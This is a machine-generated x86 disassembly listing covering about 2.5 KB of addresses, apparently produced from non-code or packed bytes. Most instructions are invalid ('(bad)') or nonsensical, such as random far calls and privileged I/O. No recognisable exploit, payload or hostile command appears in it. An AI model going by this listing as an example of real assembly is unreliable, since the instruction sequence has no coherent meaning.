  41d1ac:	jae    0x41d1d7
  41d1ae:	pop    ebp
  41d1af:	mov    bh,al
  41d1b1:	jge    0x41d198
  41d1b3:	popw   ss
  41d1b5:	mov    ah,BYTE PTR [eax-0x2e09dfbd]
  41d1bb:	or     BYTE PTR [edx],0xd9
  41d1be:	jl     0x41d18d
  41d1c0:	aaa    
	...
  41d231:	add    BYTE PTR [eax],al
  41d233:	add    bl,dh
  41d235:	and    ebp,ecx
  41d237:	push   ebp
  41d238:	(bad)  
  41d23a:	sti    
  41d23b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d23c:	pop    edi
  41d23d:	push   edx
  41d23e:	jo     0x41d1ff
  41d240:	mov    ecx,0xc4daf4af
  41d245:	cmp    DWORD PTR [ecx],eax
  41d247:	add    ch,dh
  41d249:	add    BYTE PTR [eax],al
  41d24b:	add    BYTE PTR [ecx+eax*1+0x17d5e1b0],bh
  41d252:	mov    ds:0x2cbfed16,eax
  41d257:	dec    ecx
  41d258:	adc    BYTE PTR [edx],dh
  41d25a:	mov    eax,ds:0x36953eac
  41d25f:	or     DWORD PTR [esi-0x47],esi
  41d262:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d263:	cmp    eax,0x8251951a
  41d268:	mov    ebx,0x71075b52
  41d26d:	xchg   edi,eax
  41d26e:	stos   BYTE PTR es:[edi],al
  41d26f:	mov    dh,0x39
  41d271:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d272:	dec    ecx
  41d273:	stc    
  41d274:	push   cs
  41d275:	mov    ebp,0x15451b15
  41d27a:	adc    esp,DWORD PTR [ebx]
  41d27c:	call   0xd9a1:0x6162e8bd
  41d283:	and    DWORD PTR [ecx+0x5c],eax
  41d286:	push   esp
  41d287:	add    ah,cl
  41d289:	aaa    
  41d28a:	pop    esp
  41d28b:	scas   eax,DWORD PTR es:[edi]
  41d28c:	and    al,0xc2
  41d28e:	xor    ebp,DWORD PTR [eax-0x1f976c6]
  41d294:	mov    edi,0x9c84920d
  41d299:	dec    esp
  41d29a:	mov    dh,0xc4
  41d29c:	push   edx
  41d29d:	mov    ebx,0x562fadd7
  41d2a2:	cmp    bh,bl
  41d2a4:	icebp  
  41d2a5:	(bad)  
  41d2a6:	fs xchg edx,eax
  41d2a8:	mov    edx,0x583c18f9
  41d2ad:	adc    al,0x78
  41d2af:	fadd   DWORD PTR [esi]
  41d2b1:	(bad)  
  41d2b3:	sbb    DWORD PTR [edx+esi*8+0x5e],ebp
  41d2b7:	call   0xb4bafb49
  41d2bc:	mov    WORD PTR [edx],es
  41d2be:	mov    ebp,DWORD PTR [edx]
  41d2c0:	xchg   edx,eax
  41d2c1:	mov    ecx,0x9f0a4502
  41d2c6:	outs   dx,DWORD PTR gs:[esi]
  41d2c8:	push   edi
  41d2c9:	sub    BYTE PTR [ebp+0x6a],bl
  41d2cc:	add    DWORD PTR [ebx+ecx*2-0x246dbe3e],ecx
  41d2d3:	jle    0x41d2d8
  41d2d5:	cdq    
  41d2d6:	outs   dx,BYTE PTR ds:[esi]
  41d2d7:	outs   dx,BYTE PTR ds:[esi]
  41d2d8:	loop   0x41d2ad
  41d2da:	mov    esp,0x801f9f36
  41d2df:	pusha  
  41d2e0:	dec    edi
  41d2e1:	loope  0x41d26b
  41d2e3:	dec    ebx
  41d2e4:	in     al,0x6d
  41d2e6:	xlat   BYTE PTR ds:[ebx]
  41d2e7:	rcr    DWORD PTR [ebx+0x7f7db28b],cl
  41d2ed:	inc    edi
  41d2ee:	test   eax,0x3127daf5
  41d2f3:	jge    0x41d2db
  41d2f5:	(bad)  [esi+ecx*4+0x64]
  41d2f9:	inc    eax
  41d2fa:	mov    esp,0x7ec13e38
  41d2ff:	mov    dl,0x1f
  41d301:	sbb    eax,DWORD PTR [ecx-0x5fb48f2f]
  41d307:	xchg   BYTE PTR [ebx-0xb],ah
  41d30a:	xchg   edi,eax
  41d30b:	cmc    
  41d30c:	mov    al,ds:0xf4938399
  41d311:	push   0x2b
  41d313:	pushf  
  41d314:	ret    0x12e2
  41d317:	mov    edx,0x2ba53dfe
  41d31c:	dec    eax
  41d31d:	mov    cs,WORD PTR ds:0x429329b1
  41d323:	jne    0x41d2c0
  41d325:	jle    0x41d323
  41d327:	loop   0x41d316
  41d329:	scas   eax,DWORD PTR es:[edi]
  41d32a:	in     al,dx
  41d32b:	js     0x41d306
  41d32d:	mov    dl,0xe8
  41d32f:	inc    ecx
  41d330:	aam    0xb5
  41d332:	or     DWORD PTR [edi+0x53ecb3af],0x7e
  41d339:	mov    ah,0x28
  41d33b:	out    dx,eax
  41d33c:	or     DWORD PTR [ebx-0x8],esi
  41d33f:	lahf   
  41d340:	jbe    0x41d342
	...
  41d3b2:	add    BYTE PTR [eax],al
  41d3b4:	push   ebx
  41d3b5:	and    BYTE PTR [eax+0x5faef3ae],ah
  41d3bb:	std    
  41d3bc:	cmp    eax,0x4c
  41d3bf:	(bad)  
  41d3c0:	mov    ds:0xb9aa85e6,eax
  41d3c5:	cmp    al,BYTE PTR [ecx]
  41d3c7:	add    ch,dh
  41d3c9:	add    BYTE PTR [eax],al
  41d3cb:	add    BYTE PTR [edi],cl
  41d3cd:	lahf   
  41d3ce:	shr    BYTE PTR [esi],0xc8
  41d3d1:	pop    ebx
  41d3d2:	(bad)
  41d3d5:	cwde   
  41d3d6:	ret    0xb871
  41d3d9:	imul   ebp,DWORD PTR [esi],0xffffff8b
  41d3dc:	ins    DWORD PTR es:[edi],dx
  41d3dd:	stos   DWORD PTR es:[edi],eax
  41d3de:	mov    ds:0x4219d860,eax
  41d3e3:	stc    
  41d3e4:	xchg   ebp,eax
  41d3e5:	add    bl,BYTE PTR [ebx+0x76]
  41d3e8:	test   al,0x17
  41d3ea:	sbb    eax,0x9e05e36d
  41d3ef:	xor    ecx,DWORD PTR [esi+0x383556ef]
  41d3f5:	mov    dh,0xf9
  41d3f7:	cli    
  41d3f8:	mov    ebx,0x6a63d5ea
  41d3fd:	mov    ah,0x9
  41d3ff:	and    esp,DWORD PTR ds:0xbe59dc17
  41d405:	push   edi
  41d406:	sti    
  41d407:	add    ecx,DWORD PTR [ebp+0x5e55399a]
  41d40d:	cli    
  41d40e:	jbe    0x41d43f
  41d410:	fwait
  41d411:	js     0x41d3bc
  41d413:	adc    BYTE PTR [ebp+0x6c30caab],al
  41d419:	jae    0x41d3c6
  41d41b:	shr    DWORD PTR [edx],0x34
  41d41e:	in     al,0x22
  41d420:	dec    edi
  41d421:	adc    BYTE PTR [ebp+0x3ffea08f],bh
  41d427:	das    
  41d428:	and    DWORD PTR [edi-0x6a],edx
  41d42b:	xor    BYTE PTR [edx-0x6d884200],0x8f
  41d432:	js     0x41d485
  41d434:	pusha  
  41d435:	and    al,0x84
  41d438:	test   eax,0x2e97cc21
  41d43d:	dec    edx
  41d43e:	sub    eax,edx
  41d440:	enter  0xccbf,0x73
  41d444:	and    eax,0xa44750a0
  41d449:	ins    BYTE PTR es:[edi],dx
  41d44a:	shl    BYTE PTR [edx],1
  41d44c:	rol    DWORD PTR [edi-0x4d],cl
  41d44f:	adc    DWORD PTR [ebx],0x7f
  41d452:	jp     0x41d3f4
  41d454:	xchg   edi,eax
  41d455:	imul   esi,edi,0xffffff88
  41d458:	retf   
  41d459:	loop   0x41d3e7
  41d45b:	daa    
  41d45c:	nop    DWORD PTR [edx]
  41d45f:	sub    al,dh
  41d461:	clc    
  41d462:	enter  0x143b,0xc6
  41d466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d467:	scas   eax,DWORD PTR es:[edi]
  41d468:	jae    0x41d4a6
  41d46a:	push   0x70343aa8
  41d46f:	out    0x42,al
  41d471:	cli    
  41d472:	adc    ebp,DWORD PTR [eax+0x1a21d4f3]
  41d478:	push   ss
  41d479:	iret   
  41d47a:	and    DWORD PTR [ecx+0x2c],edi
  41d47d:	jns    0x41d4ea
  41d47f:	mov    DWORD PTR [esi-0x1a],ebp
  41d482:	sbb    ecx,DWORD PTR [esi]
  41d484:	(bad)  
  41d485:	hlt    
  41d486:	or     ecx,DWORD PTR [ebx-0x677e13a]
  41d48c:	jecxz  0x41d4b5
  41d48e:	cld    
  41d48f:	adc    esi,DWORD PTR [ebp+0x2301eb62]
  41d495:	xor    DWORD PTR [edx],esp
  41d497:	call   0x9887:0xa0069f2c
  41d49e:	xor    eax,0xdf5c97cb
  41d4a3:	pushf  
  41d4a4:	int3   
  41d4a5:	(bad)  
  41d4a6:	pop    esp
  41d4a7:	push   ebx
  41d4a8:	icebp  
  41d4a9:	or     esp,DWORD PTR [edi+0x78689336]
  41d4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4b0:	mov    bh,0xea
  41d4b2:	inc    ecx
  41d4b3:	lock sahf 
  41d4b5:	stos   BYTE PTR es:[edi],al
  41d4b6:	scas   al,BYTE PTR es:[edi]
  41d4b7:	inc    ebp
  41d4b8:	fwait
  41d4b9:	inc    ebx
  41d4ba:	jmp    0x41d4ad
  41d4bc:	ret    
  41d4bd:	(bad)  
  41d4be:	hlt    
  41d4bf:	in     al,dx
  41d4c0:	loope  0x41d4c2
	...
  41d532:	add    BYTE PTR [eax],al
  41d534:	lds    esp,FWORD PTR [ebx]
  41d536:	xchg   ecx,eax
  41d537:	and    eax,0xe3f5b7f7
  41d53c:	push   ecx
  41d53d:	or     edi,DWORD PTR [edx+ecx*8-0x46e5fd0b]
  41d544:	scas   al,BYTE PTR es:[edi]
  41d545:	cmp    eax,DWORD PTR [ecx]
  41d547:	add    ch,dh
  41d549:	add    BYTE PTR [eax],al
  41d54b:	add    bh,bl
  41d54d:	sub    al,0x59
  41d54f:	sbb    BYTE PTR [ebx-0x51ee95ce],dh
  41d555:	xor    BYTE PTR [edi+0x51c82bce],al
  41d55b:	adc    ah,BYTE PTR [edx-0x35183bfb]
  41d561:	call   DWORD PTR [ebx+0x54]
  41d564:	mov    BYTE PTR [edx+eiz*4-0x3d9af287],dh
  41d56b:	in     eax,dx
  41d56c:	setbe  BYTE PTR [ecx-0x29bd3eeb]
  41d573:	lahf   
  41d574:	mov    al,0x12
  41d576:	ror    DWORD PTR [eax+0x1c4200e4],0x39
  41d57d:	mov    dl,0x1
  41d57f:	test   DWORD PTR [edx],esp
  41d581:	dec    esp
  41d582:	xor    BYTE PTR [esi+0x44],bh
  41d585:	sub    bl,BYTE PTR [ebp-0x2da471c8]
  41d58b:	pop    ebx
  41d58c:	push   ebp
  41d58d:	push   esi
  41d58e:	push   0x7c
  41d590:	and    bl,cl
  41d592:	clc    
  41d593:	pop    edx
  41d594:	sbb    al,bl
  41d596:	fcomp  QWORD PTR [edx]
  41d598:	cmp    eax,0x25e981a0
  41d59d:	cmp    esi,DWORD PTR [ecx+esi*2+0x19]
  41d5a1:	jmp    0xb58d:0xcc950c3e
  41d5a8:	xchg   ebx,eax
  41d5a9:	jle    0x41d5ac
  41d5ab:	idiv   dh
  41d5ad:	int    0x38
  41d5af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5b0:	xor    BYTE PTR [esi+0x6f65fa9e],0xd3
  41d5b7:	ins    BYTE PTR es:[edi],dx
  41d5b8:	shr    BYTE PTR [ebp-0x33],1
  41d5bb:	cld    
  41d5bc:	mov    eax,0xc9b6c43f
  41d5c1:	xor    BYTE PTR gs:[edi],bh
  41d5c4:	mov    fs,WORD PTR [edi]
  41d5c6:	mov    esi,0xb9165d43
  41d5cb:	test   DWORD PTR [esi+0x49],ecx
  41d5ce:	xchg   BYTE PTR ds:0xe9d9b12,dl
  41d5d4:	jae    0x41d55a
  41d5d6:	adc    eax,0x3e99ff70
  41d5db:	push   ebx
  41d5dc:	emms   
  41d5de:	cli    
  41d5df:	aam    0x3
  41d5e1:	iret   
  41d5e2:	shl    DWORD PTR [ecx-0x16464786],cl
  41d5e8:	jbe    0x41d662
  41d5ea:	inc    ecx
  41d5eb:	ret    
  41d5ec:	and    eax,0x3358ea26
  41d5f1:	mov    esi,0xd88c98dd
  41d5f6:	xor    esp,DWORD PTR [esi-0x3b6999ef]
  41d5fc:	add    eax,edx
  41d5fe:	jge    0x41d673
  41d600:	scas   eax,DWORD PTR es:[edi]
  41d601:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d602:	sub    al,0xaa
  41d604:	icebp  
  41d605:	and    BYTE PTR [edi],dh
  41d607:	lds    edx,FWORD PTR [eax]
  41d609:	sub    bl,BYTE PTR [esi-0x5a]
  41d60c:	aam    0x26
  41d60e:	mov    ebp,0xeddf1257
  41d613:	cmp    BYTE PTR [esi],0x9f
  41d616:	(bad)  
  41d617:	xor    edx,DWORD PTR [edx+0x7f6482f1]
  41d61d:	fdivr  st,st(1)
  41d61f:	adc    ch,cl
  41d621:	cld    
  41d622:	sbb    DWORD PTR [eax+0x4d],ebx
  41d625:	jae    0x41d691
  41d627:	add    al,0xa9
  41d629:	and    bh,ch
  41d62b:	pop    ebp
  41d62c:	ror    DWORD PTR ds:0xe2d6f810,cl
  41d632:	shl    DWORD PTR [edi],cl
  41d634:	lock leave 
  41d636:	cmp    BYTE PTR [edi+0x51ea5ecf],ch
  41d63c:	(bad)  
  41d63d:	test   esp,0xd9c4
	...
  41d6b3:	add    dl,bl
  41d6b5:	add    edx,eax
  41d6b7:	xchg   bl,bl
  41d6b9:	(bad)  
  41d6ba:	ficomp WORD PTR [ebp+0x8]
  41d6bd:	push   0xa3650a3b
  41d6c2:	loope  0x41d6f6
  41d6c4:	mov    ds:0xf500013c,eax
  41d6c9:	add    BYTE PTR [eax],al
  41d6cb:	add    BYTE PTR [esp+edi*8-0x41],bl
  41d6cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6d0:	rol    BYTE PTR [ecx],0x25
  41d6d3:	in     eax,dx
  41d6d4:	stos   BYTE PTR es:[edi],al
  41d6d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6d6:	xlat   BYTE PTR ds:[ebx]
  41d6d7:	pop    ecx
  41d6d8:	and    BYTE PTR [ebp+0x79],bh
  41d6db:	mov    cl,0xdf
  41d6dd:	pop    ebx
  41d6de:	xor    DWORD PTR [ebx-0x4e5b8cbf],esp
  41d6e4:	arpl   WORD PTR ds:0xba514452,dx
  41d6ea:	dec    ebx
  41d6eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6ec:	popa   
  41d6ed:	sbb    al,0x5f
  41d6ef:	mov    eax,0xfe1a0237
  41d6f4:	mov    ch,BYTE PTR [esi+edx*8]
  41d6f7:	mov    esp,0x5f0aa51d
  41d6fc:	ins    DWORD PTR es:[edi],dx
  41d6fd:	jno    0x41d76d
  41d6ff:	addr16 sub al,0xfe
  41d702:	fstp   TBYTE PTR ds:0xb313941b
  41d709:	ret    
  41d70a:	inc    eax
  41d70b:	mov    cl,0xf3
  41d70d:	fs andnps xmm5,xmm1
  41d711:	pop    ecx
  41d712:	inc    ebp
  41d713:	jp     0x41d6d1
  41d715:	psadbw mm7,QWORD PTR [ecx]
  41d718:	dec    esi
  41d719:	xor    al,0x7e
  41d71b:	rcl    ebx,0xb3
  41d71e:	push   ds
  41d71f:	push   ecx
  41d720:	cmp    DWORD PTR [eax+0x20],0x4d
  41d724:	lea    ebx,[ebx]
  41d726:	dec    esi
  41d727:	into   
  41d728:	push   ecx
  41d729:	mov    edx,0x265d9f0d
  41d72e:	je     0x41d723
  41d730:	mov    DWORD PTR [ecx-0x74127943],edx
  41d736:	push   0x62ea46b2
  41d73b:	sub    BYTE PTR [edx+esi*1],dl
  41d73e:	loopne 0x41d779
  41d740:	and    eax,0x89c706a0
  41d745:	imul   ebx,DWORD PTR [esi],0x40
  41d748:	stos   BYTE PTR es:[edi],al
  41d749:	add    edx,DWORD PTR [eax]
  41d74b:	test   al,0xc0
  41d74d:	call   0xee:0xb2f702e9
  41d754:	xchg   ebp,eax
  41d755:	loope  0x41d70f
  41d757:	sbb    eax,0x60455a74
  41d75c:	mov    ds:0xf7e0a4a7,al
  41d761:	int3   
  41d762:	or     DWORD PTR [edi-0x18],ebp
  41d765:	or     al,BYTE PTR [eax-0x36443ed3]
  41d76b:	retf   
  41d76c:	ss jns 0x41d721
  41d76f:	sahf   
  41d770:	mov    edi,0xea8f9f10
  41d775:	sbb    cl,bl
  41d777:	cmp    ebx,DWORD PTR [ebx-0x47]
  41d77a:	dec    ecx
  41d77b:	jg     0x41d72b
  41d77d:	pop    edx
  41d77e:	retf   
  41d77f:	test   al,0x15
  41d781:	icebp  
  41d782:	lods   al,BYTE PTR ds:[esi]
  41d783:	imul   esi,edi,0x7ca567ad
  41d789:	and    DWORD PTR [edx-0x21],esi
  41d78c:	pop    ecx
  41d78d:	push   ebx
  41d78e:	xchg   ecx,eax
  41d78f:	ficomp DWORD PTR [edi-0x4633ed5]
  41d795:	fcmove st,st(0)
  41d797:	and    cl,BYTE PTR [ebx-0x49]
  41d79a:	sub    edx,esp
  41d79c:	push   edi
  41d79d:	jb     0x41d75e
  41d79f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7a0:	scas   al,BYTE PTR es:[edi]
  41d7a1:	sbb    eax,0xd6a0acfe
  41d7a6:	scas   eax,DWORD PTR es:[edi]
  41d7a7:	push   cs
  41d7a8:	test   al,0x8e
  41d7aa:	mov    dh,0x8f
  41d7ac:	push   eax
  41d7ad:	mov    edx,DWORD PTR [edi+ebp*2-0x47]
  41d7b1:	(bad)  
  41d7b3:	push   ecx
  41d7b4:	aas    
  41d7b5:	bound  edx,QWORD PTR [eax+0xf]
  41d7b8:	cmp    DWORD PTR [ecx],0xea0a21e1
  41d7be:	inc    ecx
  41d7bf:	push   0xffffff96
	...
  41d831:	add    BYTE PTR [eax],al
  41d833:	add    BYTE PTR [ebx+0x34],ah
  41d836:	lods   eax,DWORD PTR ds:[esi]
  41d837:	xor    al,0xff
  41d839:	mov    ebp,0xf28777fb
  41d83e:	pop    es
  41d83f:	add    esi,ecx
  41d841:	ds call 0x17f709b
  41d847:	add    ch,dh
  41d849:	add    BYTE PTR [eax],al
  41d84b:	add    BYTE PTR [esi-0x4c44fe47],dl
  41d851:	aad    0x1e
  41d853:	jo     0x41d811
  41d855:	loope  0x41d8b6
  41d857:	jae    0x41d88d
  41d859:	mov    al,0x67
  41d85b:	push   edi
  41d85c:	outs   dx,BYTE PTR ds:[esi]
  41d85d:	int    0x7e
  41d85f:	xor    ch,bh
  41d861:	jg     0x41d840
  41d863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d864:	popf   
  41d865:	rcr    eax,cl
  41d867:	(bad)  
  41d868:	aaa    
  41d869:	shl    DWORD PTR [ebx+0x67],0xe1
  41d86d:	pusha  
  41d86e:	inc    esi
  41d86f:	in     al,dx
  41d870:	mov    bh,BYTE PTR [esi-0xa]
  41d873:	adc    cl,BYTE PTR ss:[ecx+0x70f0e6fe]
  41d87a:	xor    edx,0xd99f0a04
  41d880:	and    DWORD PTR [ebx-0x62],0x1e
  41d884:	jnp    0x41d8c7
  41d886:	fdiv   QWORD PTR [eax]
  41d888:	test   DWORD PTR [ebx+0x4f],eax
  41d88b:	addr16 ror bl,1
  41d88e:	ins    DWORD PTR es:[edi],dx
  41d88f:	imul   edi,DWORD PTR [esi],0xffffffed
  41d892:	clts   
  41d894:	adc    BYTE PTR [edi-0x3c28ad63],bh
  41d89a:	dec    esp
  41d89b:	js     0x41d8ee
  41d89d:	xor    bh,BYTE PTR [eax-0x58]
  41d8a0:	cmovae ebp,esp
  41d8a3:	pop    edx
  41d8a4:	adc    BYTE PTR [edi+0x73],bh
  41d8a7:	push   cs
  41d8a8:	pop    edi
  41d8a9:	scas   al,BYTE PTR es:[edi]
  41d8aa:	clc    
  41d8ab:	retf   
  41d8ac:	lds    eax,FWORD PTR [edi]
  41d8ae:	and    esi,ebp
  41d8b0:	sub    BYTE PTR [edx+edx*2-0x12],bh
  41d8b4:	mov    ds:0x2cbdc424,al
  41d8b9:	inc    ebp
  41d8ba:	sbb    DWORD PTR [esi-0xcfd6d7e],eax
  41d8c0:	scas   al,BYTE PTR es:[edi]
  41d8c1:	cdq    
  41d8c2:	popf   
  41d8c3:	ret    
  41d8c4:	adc    eax,0x366cfc1d
  41d8c9:	push   esi
  41d8ca:	push   edi
  41d8cb:	out    dx,al
  41d8cc:	mov    WORD PTR ds:0x1e1e5f51,fs
  41d8d2:	ins    BYTE PTR es:[edi],dx
  41d8d3:	xor    ecx,edx
  41d8d5:	pop    esp
  41d8d6:	out    0x90,al
  41d8d8:	dec    edi
  41d8d9:	cmp    DWORD PTR [ebp+0x5fe9a9d0],esi
  41d8df:	(bad)  
  41d8e0:	push   ebp
  41d8e1:	or     ah,BYTE PTR [edi]
  41d8e3:	daa    
  41d8e4:	punpckhwd mm1,QWORD PTR [ebp+0x2]
  41d8e8:	stos   DWORD PTR es:[edi],eax
  41d8e9:	arpl   WORD PTR [ecx],si
  41d8eb:	les    edi,FWORD PTR ds:0x99a45b35
  41d8f1:	stc    
  41d8f2:	add    cl,al
  41d8f4:	cwde   
  41d8f5:	pop    edi
  41d8f6:	lds    ebp,FWORD PTR [eax]
  41d8f8:	stos   BYTE PTR es:[edi],al
  41d8f9:	cmc    
  41d8fa:	(bad)  
  41d8fb:	jp     0x41d8fa
  41d8fd:	sbb    BYTE PTR [ebx-0x446af9bb],cl
  41d903:	pop    ss
  41d904:	xabort 0x9f
  41d907:	rdtsc  
  41d909:	frstor [ebp-0x38711732]
  41d90f:	pcmpgtb mm0,mm1
  41d912:	div    cl
  41d914:	stc    
  41d915:	adc    eax,0x823ca8c0
  41d91a:	fisub  WORD PTR [esi+0x842a404]
  41d920:	pusha  
  41d921:	fimul  WORD PTR [ecx+edi*4-0x49]
  41d925:	pop    esp
  41d926:	fwait
  41d927:	pop    ss
  41d928:	mov    ah,BYTE PTR [ecx-0x60]
  41d92b:	(bad)  
  41d92c:	test   al,0x85
  41d92e:	out    0xb0,al
  41d930:	add    BYTE PTR [eax+0x79],cl
  41d933:	rcr    ebx,0x78
  41d936:	and    eax,edx
  41d938:	sahf   
  41d939:	mov    eax,0x6741ca73
  41d93e:	sbb    ebp,DWORD PTR [ecx]
  41d940:	mov    bl,0x0
	...
  41d9b2:	add    BYTE PTR [eax],al
  41d9b4:	lock retf 0xfc94
  41d9b8:	mov    esi,0xfdcef8fe
  41d9bd:	cwde   
  41d9be:	sbb    eax,0x95c861c
  41d9c3:	mov    dh,0x8d
  41d9c5:	add    DWORD PTR ds:[eax],eax
  41d9c8:	cmc    
  41d9c9:	add    BYTE PTR [eax],al
  41d9cb:	add    BYTE PTR [edi-0x6f],ch
  41d9ce:	jno    0x41d993
  41d9d0:	retf   
  41d9d1:	ss jmp 0x5c3f0be5
  41d9d7:	(bad)  [eax]
  41d9d9:	xchg   BYTE PTR [edx],dh
  41d9db:	xchg   edx,eax
  41d9dc:	push   esp
  41d9dd:	pop    es
  41d9de:	int    0xec
  41d9e0:	jns    0x41d9c9
  41d9e2:	mov    ebx,0xcfa376a9
  41d9e7:	dec    esi
  41d9e8:	xor    ebx,DWORD PTR [ebx-0x5e]
  41d9eb:	mov    eax,ds:0x96df71d
  41d9f0:	das    
  41d9f1:	int    0x1f
  41d9f3:	out    dx,eax
  41d9f4:	enter  0xb10e,0x69
  41d9f8:	ins    BYTE PTR es:[edi],dx
  41d9f9:	nop
  41d9fa:	sbb    ecx,ecx
  41d9fc:	sub    BYTE PTR [ebx-0x65],bl
  41d9ff:	push   eax
  41da00:	mov    esp,DWORD PTR [ecx-0x2f]
  41da03:	aad    0x4f
  41da05:	xchg   esi,eax
  41da06:	cmp    BYTE PTR [eax+eiz*1+0xb],bh
  41da0a:	test   DWORD PTR [ecx-0xf],ebx
  41da0d:	lahf   
  41da0e:	int    0x16
  41da10:	ror    DWORD PTR [ecx-0x6c],1
  41da13:	sbb    ah,BYTE PTR [edx-0x11887d0a]
  41da19:	inc    edx
  41da1a:	jno    0x41d99d
  41da1c:	adc    eax,0xd669039b
  41da21:	push   ebp
  41da22:	or     eax,0xaae51532
  41da27:	cmp    DWORD PTR [ebx],eax
  41da29:	xchg   edx,eax
  41da2a:	fsubr  QWORD PTR [eax-0x72]
  41da2d:	mov    al,ds:0x78740d08
  41da32:	test   eax,0x8625c9bf
  41da37:	(bad)  
  41da39:	inc    BYTE PTR [edi+0x12]
  41da3c:	or     DWORD PTR [ebp-0x22270ae6],0xffffffc9
  41da43:	pushf  
  41da44:	cwde   
  41da45:	test   al,bl
  41da47:	push   ebx
  41da48:	aas    
  41da49:	mov    esp,0xe8132fa3
  41da4e:	push   ss
  41da4f:	xchg   DWORD PTR [edx+ebx*2+0x35],eax
  41da53:	ins    DWORD PTR es:[edi],dx
  41da54:	leave  
  41da55:	or     eax,DWORD PTR ds:0x3e38718b
  41da5b:	out    dx,eax
  41da5c:	call   0x1eee:0xf470e2d0
  41da63:	mov    ds:0xc8192484,al
  41da68:	jmp    0x41da35
  41da6a:	jmp    0x22b5:0xa3d46155
  41da71:	sbb    BYTE PTR [ebx+0x34],ch
  41da74:	jecxz  0x41da2d
  41da76:	jg     0x41dad4
  41da78:	cli    
  41da79:	sub    BYTE PTR [ebx-0xa46f701],dh
  41da7f:	ins    DWORD PTR es:[edi],dx
  41da80:	arpl   WORD PTR [esi+edi*8+0x6e],si
  41da84:	mov    bl,0x29
  41da86:	sbb    al,0x4b
  41da88:	dec    edi
  41da89:	ret    0x2f13
  41da8c:	add    BYTE PTR [ebp-0x163b624a],dh
  41da92:	loope  0x41daf7
  41da94:	std    
  41da95:	aad    0x43
  41da97:	xchg   esi,eax
  41da98:	add    BYTE PTR [ebx+0x44f05960],al
  41da9e:	xchg   ebx,eax
  41da9f:	loop   0x41dabc
  41daa1:	sbb    edi,DWORD PTR [ebp+0x20]
  41daa4:	mov    edx,DWORD PTR [edx-0x6f67ba4c]
  41daaa:	(bad)  
  41daab:	out    dx,eax
  41daac:	cld    
  41daad:	jmp    0xab0f:0xa35018bb
  41dab4:	push   ss
  41dab5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dab6:	inc    eax
  41dab7:	pop    ebx
  41dab8:	jge    0x41daad
  41daba:	dec    ebx
  41dabb:	push   DWORD PTR [esi]
  41dabd:	shl    BYTE PTR [edx+0x14dc],cl
	...
  41db33:	add    BYTE PTR [ecx],ch
  41db35:	(bad)  
  41db36:	sti    
  41db37:	pop    ebp
  41db38:	(bad)  
  41db39:	jge    0x41daea
  41db3b:	div    dl
  41db3d:	cmp    ebp,0xb
  41db40:	(bad)  
  41db41:	and    eax,0x3f820f20
  41db46:	add    DWORD PTR [eax],eax
  41db48:	cmc    
  41db49:	add    BYTE PTR [eax],al
  41db4b:	add    cl,ch
  41db4d:	or     BYTE PTR [ebx],bl
  41db4f:	xor    al,0xe3
  41db51:	pop    ds
  41db52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db53:	or     eax,DWORD PTR [esi]
  41db55:	mov    dh,BYTE PTR [ebp-0x23]
  41db58:	xchg   DWORD PTR [edx-0x49cb5674],edx
  41db5e:	xor    edi,DWORD PTR [ecx+ecx*1]
  41db61:	dec    edi
  41db62:	daa    
  41db63:	nop
  41db64:	cmp    al,0x9d
  41db66:	sub    dh,bh
  41db68:	bound  esi,QWORD PTR [edi+0x50caab44]
  41db6e:	cmp    al,0xd1
  41db70:	daa    
  41db71:	mov    eax,ds:0x8e3f1a0
  41db76:	mov    esp,0xc8eb6e61
  41db7b:	adc    ecx,DWORD PTR [edx-0x62]
  41db7e:	js     0x41db35
  41db80:	mov    dl,0xa4
  41db82:	dec    ebp
  41db83:	mov    edx,0x7173554
  41db88:	iret   
  41db89:	pop    ds
  41db8a:	sub    ebx,ecx
  41db8c:	mov    esi,DWORD PTR [eax-0x38]
  41db8f:	mov    eax,ds:0x14f695db
  41db94:	stos   BYTE PTR es:[edi],al
  41db95:	sub    eax,0x16c1c14a
  41db9a:	lock sub ebx,DWORD PTR [edi-0x51]
  41db9e:	sbb    DWORD PTR [ebx],0xffffffc6
  41dba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dba2:	xchg   esp,eax
  41dba3:	fs push esi
  41dba5:	es push eax
  41dba7:	xchg   edx,eax
  41dba8:	dec    ecx
  41dba9:	leave  
  41dbaa:	inc    esp
  41dbab:	inc    edi
  41dbac:	pop    ds
  41dbad:	(bad)  
  41dbae:	xchg   esi,eax
  41dbaf:	cmp    esp,eax
  41dbb1:	cmp    BYTE PTR [ebx+esi*4+0xb],bh
  41dbb5:	mov    al,0xeb
  41dbb7:	cmp    edi,ebx
  41dbb9:	int    0xfc
  41dbbb:	scas   al,BYTE PTR es:[edi]
  41dbbc:	jns    0x41db9d
  41dbbe:	ror    BYTE PTR [eax-0x75],cl
  41dbc1:	lea    ebp,[ecx]
  41dbc3:	sbb    eax,0x7be55b08
  41dbc8:	dec    eax
  41dbc9:	cmp    al,0x79
  41dbcb:	jnp    0x41db69
  41dbcd:	daa    
  41dbce:	sub    bl,BYTE PTR [ebx+0x6c9d1db7]
  41dbd4:	jnp    0x41dbae
  41dbd6:	push   es
  41dbd7:	pop    es
  41dbd8:	std    
  41dbd9:	sub    ah,ch
  41dbdb:	sbb    al,0x40
  41dbdd:	call   0x94850a1b
  41dbe2:	jbe    0x41dc57
  41dbe4:	cmp    ebx,0xffffffdf
  41dbe7:	pop    ds
  41dbe8:	add    eax,DWORD PTR [ebx+0x12871b32]
  41dbee:	jb     0x41dba6
  41dbf0:	das    
  41dbf1:	stos   DWORD PTR es:[edi],eax
  41dbf2:	jg     0x41dc23
  41dbf4:	push   edx
